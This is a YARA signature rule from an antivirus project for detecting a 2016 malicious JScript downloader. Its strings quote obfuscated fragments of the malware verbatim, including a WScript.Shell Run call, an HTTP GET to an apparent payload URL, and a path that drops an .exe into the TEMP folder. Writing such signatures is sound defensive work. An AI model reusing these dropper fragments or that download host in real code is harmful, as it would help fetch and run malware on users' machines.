rule sig_20160328_18290edd4cbd194ec3e671286333e304 {
  meta:
    description = "datamaliciousorder - file 20160328_18290edd4cbd194ec3e671286333e304.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ef149d0322ad8fe6433eadabff8e2a6ef948992aebd8f4e8435d81d174744eb0"

  strings:
    $s1  = "function Edrydmnc() {return Zzgojr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"gfipv72EMnwWnCPw.exe\";};" fullword ascii
    $s2  = "Scrkahppjp[Wkscbsfkt](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "do {WScript[Zyptwv](Akfcw() * 11)} while (Scrkahppjp[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Zzgojr = function Cxoav() {return WScript[Urdxace](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Fqveptlb(Cvyyr, Wmlqsofjnj){return Cvyyr - Wmlqsofjnj;};" fullword ascii
    $s6  = "function Ekevaevsen() {return ((Nbcsoba == true) && (Nbcsoba == Verreawc)) ? 1 : Uelbi;};" fullword ascii
    $s7  = "function Ryuqkdga(Lkjkdeny){Zzgojr[\"Run\"](Lkjkdeny, Uelbi, Uelbi);};" fullword ascii
    $s8  = "var Verreawc = false;" fullword ascii
    $s9  = "Nbcsoba = true; " fullword ascii
    $s10 = "var Nbcsoba = false;" fullword ascii
    $s11 = "return Fqveptlb(Vwyclkbu, Mjqwdw);" fullword ascii
    $s12 = "var Oqfzgj = false;" fullword ascii
    $s13 = "function Cdbddosh(){return Bwqvugqv;};" fullword ascii
    $s14 = "function Kimwtsr()" fullword ascii
    $s15 = "function Gwnfmqyhh(Scxuodsc) {var Vwzlm = (1, 2, 3, 4, 5, Scxuodsc); return Vwzlm;};" fullword ascii
    $s16 = " while (Tdlahzqyb){" fullword ascii
    $s17 = "function Nhzvna(){return Urdxace;};" fullword ascii
    $s18 = "function Akfcw(){return 22;};" fullword ascii
    $s19 = "var Nwbdtpjys = new this[\"Date\"]();" fullword ascii
    $s20 = "Verreawc = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}